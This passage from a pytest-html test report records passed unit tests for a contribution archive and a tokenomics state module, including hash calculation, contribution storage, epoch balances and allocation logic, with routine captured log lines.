TestPoCArchive.test_archive_error_handling - WARNING - \u26a0\ufe0f  Expected permission error when saving to read-only directory\n2025-12-18 09:23:56,158 - TestPoCArchive.test_archive_error_handling - INFO - \u2705 Archive handles corrupted JSON gracefully\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_archive_error_handling:test_framework.py:390 Testing PoC archive error handling\nWARNING  TestPoCArchive.test_archive_error_handling:test_framework.py:400 \u26a0\ufe0f  Expected permission error when saving to read-only directory\nINFO     TestPoCArchive.test_archive_error_handling:test_framework.py:390 \u2705 Archive handles corrupted JSON gracefully\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_archive_initialization&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_archive_initialization&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_archive_initialization&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_archive_initialization - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,159 - TestPoCArchive.test_archive_initialization - INFO - Testing PoC archive initialization\n2025-12-18 09:23:56,160 - TestPoCArchive.test_archive_initialization - INFO - \u2705 PoC archive initialized successfully\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_archive_initialization:test_framework.py:390 Testing PoC archive initialization\nINFO     TestPoCArchive.test_archive_initialization:test_framework.py:390 \u2705 PoC archive initialized successfully\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_archive_statistics&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_archive_statistics&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_archive_statistics&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_archive_statistics - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,160 - TestPoCArchive.test_archive_statistics - INFO - Testing archive statistics\n2025-12-18 09:23:56,161 - TestPoCArchive.test_archive_statistics - INFO - \u2705 Archive statistics working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_archive_statistics:test_framework.py:390 Testing archive statistics\nINFO     TestPoCArchive.test_archive_statistics:test_framework.py:390 \u2705 Archive statistics working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_content_hash_calculation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_content_hash_calculation&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_content_hash_calculation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_content_hash_calculation - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,161 - TestPoCArchive.test_content_hash_calculation - INFO - Testing content hash calculation\n2025-12-18 09:23:56,161 - TestPoCArchive.test_content_hash_calculation - INFO - \u2705 Content hash calculation working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_content_hash_calculation:test_framework.py:390 Testing content hash calculation\nINFO     TestPoCArchive.test_content_hash_calculation:test_framework.py:390 \u2705 Content hash calculation working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_content_hash_history&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_content_hash_history&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_content_hash_history&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_content_hash_history - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,162 - TestPoCArchive.test_content_hash_history - INFO - Testing content hash history\n2025-12-18 09:23:56,162 - TestPoCArchive.test_content_hash_history - INFO - \u2705 Content hash history working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_content_hash_history:test_framework.py:390 Testing content hash history\nINFO     TestPoCArchive.test_content_hash_history:test_framework.py:390 \u2705 Content hash history working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_contribution_status_enum&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_contribution_status_enum&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_contribution_status_enum&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_contribution_status_enum - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,163 - TestPoCArchive.test_contribution_status_enum - INFO - Testing contribution status enum\n2025-12-18 09:23:56,163 - TestPoCArchive.test_contribution_status_enum - INFO - \u2705 Contribution status enum values correct\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_contribution_status_enum:test_framework.py:390 Testing contribution status enum\nINFO     TestPoCArchive.test_contribution_status_enum:test_framework.py:390 \u2705 Contribution status enum values correct\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_contribution_storage&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_contribution_storage&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_contribution_storage&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_contribution_storage - PASSED\nDuration: 0.00s\nCategory: unit\nMetrics:\n  contribution_storage_success: True\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,163 - TestPoCArchive.test_contribution_storage - INFO - Testing contribution storage and retrieval\n2025-12-18 09:23:56,163 - TestPoCArchive.test_contribution_storage - INFO - \u2705 Contribution storage working - stored and retrieved: test_storage_7588308101371089835\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_contribution_storage:test_framework.py:390 Testing contribution storage and retrieval\nINFO     TestPoCArchive.test_contribution_storage:test_framework.py:390 \u2705 Contribution storage working - stored and retrieved: test_storage_7588308101371089835\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_get_all_contributions_with_filters&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_get_all_contributions_with_filters&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_get_all_contributions_with_filters&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_get_all_contributions_with_filters - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,164 - TestPoCArchive.test_get_all_contributions_with_filters - INFO - Testing contribution filtering\n2025-12-18 09:23:56,164 - TestPoCArchive.test_get_all_contributions_with_filters - INFO - \u2705 Contribution filtering working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_get_all_contributions_with_filters:test_framework.py:390 Testing contribution filtering\nINFO     TestPoCArchive.test_get_all_contributions_with_filters:test_framework.py:390 \u2705 Contribution filtering working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_metal_type_enum&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_metal_type_enum&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_metal_type_enum&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_metal_type_enum - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,165 - TestPoCArchive.test_metal_type_enum - INFO - Testing metal type enum\n2025-12-18 09:23:56,165 - TestPoCArchive.test_metal_type_enum - INFO - \u2705 Metal type enum values correct\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_metal_type_enum:test_framework.py:390 Testing metal type enum\nINFO     TestPoCArchive.test_metal_type_enum:test_framework.py:390 \u2705 Metal type enum values correct\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_redundancy_check_content&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_redundancy_check_content&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_redundancy_check_content&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_redundancy_check_content - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,166 - TestPoCArchive.test_redundancy_check_content - INFO - Testing redundancy check content retrieval\n2025-12-18 09:23:56,167 - TestPoCArchive.test_redundancy_check_content - INFO - \u2705 Redundancy check content retrieval working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_redundancy_check_content:test_framework.py:390 Testing redundancy check content retrieval\nINFO     TestPoCArchive.test_redundancy_check_content:test_framework.py:390 \u2705 Redundancy check content retrieval working\n\n&#34;}], &#34;tests/test_core_modules.py::TestPoCArchive::test_update_contribution&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestPoCArchive::test_update_contribution&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestPoCArchive::test_update_contribution&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_update_contribution - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,167 - TestPoCArchive.test_update_contribution - INFO - Testing contribution updates\n2025-12-18 09:23:56,168 - TestPoCArchive.test_update_contribution - INFO - \u2705 Contribution updates working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestPoCArchive.test_update_contribution:test_framework.py:390 Testing contribution updates\nINFO     TestPoCArchive.test_update_contribution:test_framework.py:390 \u2705 Contribution updates working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_allocation_calculation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_allocation_calculation&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_allocation_calculation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_allocation_calculation - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,168 - TestTokenomicsState.test_allocation_calculation - INFO - Testing allocation calculation\n2025-12-18 09:23:56,169 - TestTokenomicsState.test_allocation_calculation - INFO - \u2705 Allocation calculation working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_allocation_calculation:test_framework.py:390 Testing allocation calculation\nINFO     TestTokenomicsState.test_allocation_calculation:test_framework.py:390 \u2705 Allocation calculation working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_allocation_recording&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_allocation_recording&#34;, &#34;duration&#34;: &#34;2 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_allocation_recording&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;2 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_allocation_recording - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,169 - TestTokenomicsState.test_allocation_recording - INFO - Testing allocation recording\n2025-12-18 09:23:56,171 - TestTokenomicsState.test_allocation_recording - INFO - \u2705 Allocation recording working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_allocation_recording:test_framework.py:390 Testing allocation recording\nINFO     TestTokenomicsState.test_allocation_recording:test_framework.py:390 \u2705 Allocation recording working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_coherence_density_updates&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_coherence_density_updates&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_coherence_density_updates&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_coherence_density_updates - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,172 - TestTokenomicsState.test_coherence_density_updates - INFO - Testing coherence density updates\n2025-12-18 09:23:56,173 - TestTokenomicsState.test_coherence_density_updates - INFO - \u2705 Coherence density updates working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_coherence_density_updates:test_framework.py:390 Testing coherence density updates\nINFO     TestTokenomicsState.test_coherence_density_updates:test_framework.py:390 \u2705 Coherence density updates working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_balance&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_balance&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_epoch_balance&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\nWarning: Failed to load state: Expecting value: line 1 column 1 (char 0)\n\n======================================================================\nTEST RESULT: test_epoch_balance - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,173 - TestTokenomicsState.test_epoch_balance - INFO - Testing epoch balance retrieval\n2025-12-18 09:23:56,173 - TestTokenomicsState.test_epoch_balance - INFO - \u2705 Epoch balance retrieval working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_epoch_balance:test_framework.py:390 Testing epoch balance retrieval\nINFO     TestTokenomicsState.test_epoch_balance:test_framework.py:390 \u2705 Epoch balance retrieval working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_enum&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_enum&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_epoch_enum&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_epoch_enum - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,174 - TestTokenomicsState.test_epoch_enum - INFO - Testing epoch enum\n2025-12-18 09:23:56,174 - TestTokenomicsState.test_epoch_enum - INFO - \u2705 Epoch enum values correct\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_epoch_enum:test_framework.py:390 Testing epoch enum\nINFO     TestTokenomicsState.test_epoch_enum:test_framework.py:390 \u2705 Epoch enum values correct\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_info&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_info&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_epoch_info&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_epoch_info - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,174 - TestTokenomicsState.test_epoch_info - INFO - Testing epoch info\n2025-12-18 09:23:56,175 - TestTokenomicsState.test_epoch_info - INFO - \u2705 Epoch info working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_epoch_info:test_framework.py:390 Testing epoch info\nINFO     TestTokenomicsState.test_epoch_info:test_framework.py:390 \u2705 Epoch info working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_qualification&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_qualification&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_epoch_qualification&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_epoch_qualification - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,175 - TestTokenomicsState.test_epoch_qualification - INFO - Testing epoch qualification\n2025-12-18 09:23:56,175 - TestTokenomicsState.test_epoch_qualification - INFO - \u2705 Epoch qualification working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_epoch_qualification:test_framework.py:390 Testing epoch qualification\nINFO     TestTokenomicsState.test_epoch_qualification:test_framework.py:390 \u2705 Epoch qualification working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_transitions&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_epoch_transitions&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_epoch_transitions&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_epoch_transitions - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,176 - TestTokenomicsState.test_epoch_transitions - INFO - Testing epoch transitions\n2025-12-18 09:23:56,176 - TestTokenomicsState.test_epoch_transitions - INFO - \u26a0\ufe0f  Epoch advancement method not available\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_epoch_transitions:test_framework.py:390 Testing epoch transitions\nINFO     TestTokenomicsState.test_epoch_transitions:test_framework.py:390 \u26a0\ufe0f  Epoch advancement method not available\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_l1_sync&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_l1_sync&#34;, &#34;duration&#34;: &#34;1 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_l1_sync&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;1 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_l1_sync - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,176 - TestTokenomicsState.test_l1_sync - INFO - Testing L1 synchronization\n2025-12-18 09:23:56,177 - TestTokenomicsState.test_l1_sync - INFO - \u2705 L1 synchronization working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_l1_sync:test_framework.py:390 Testing L1 synchronization\nINFO     TestTokenomicsState.test_l1_sync:test_framework.py:390 \u2705 L1 synchronization working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_pod_score_calculation&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_pod_score_calculation&#34;, &#34;duration&#34;: &#34;0 ms&#34;, &#34;resultsTableRow&#34;: [&#34;&lt;td class=\&#34;col-result\&#34;&gt;Passed&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-testId\&#34;&gt;tests/test_core_modules.py::TestTokenomicsState::test_pod_score_calculation&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-duration\&#34;&gt;0 ms&lt;/td&gt;&#34;, &#34;&lt;td class=\&#34;col-links\&#34;&gt;&lt;/td&gt;&#34;], &#34;log&#34;: &#34;----------------------------- Captured stdout call -----------------------------\n\n======================================================================\nTEST RESULT: test_pod_score_calculation - PASSED\nDuration: 0.00s\nCategory: unit\n======================================================================\n\n----------------------------- Captured stderr call -----------------------------\n2025-12-18 09:23:56,178 - TestTokenomicsState.test_pod_score_calculation - INFO - Testing PoD score calculation\n2025-12-18 09:23:56,178 - TestTokenomicsState.test_pod_score_calculation - INFO - \u2705 PoD score calculation working\n\n------------------------------ Captured log call -------------------------------\nINFO     TestTokenomicsState.test_pod_score_calculation:test_framework.py:390 Testing PoD score calculation\nINFO     TestTokenomicsState.test_pod_score_calculation:test_framework.py:390 \u2705 PoD score calculation working\n\n&#34;}], &#34;tests/test_core_modules.py::TestTokenomicsState::test_tier_availability&#34;: [{&#34;extras&#34;: [], &#34;result&#34;: &#34;Passed&#34;, &#34;testId&#34;: &#34;tests/test_core_modules.py::TestTokenomicsState::test_tier_availability&#34;, &#34;duration&#34;: &#34;0 ms&#34;, 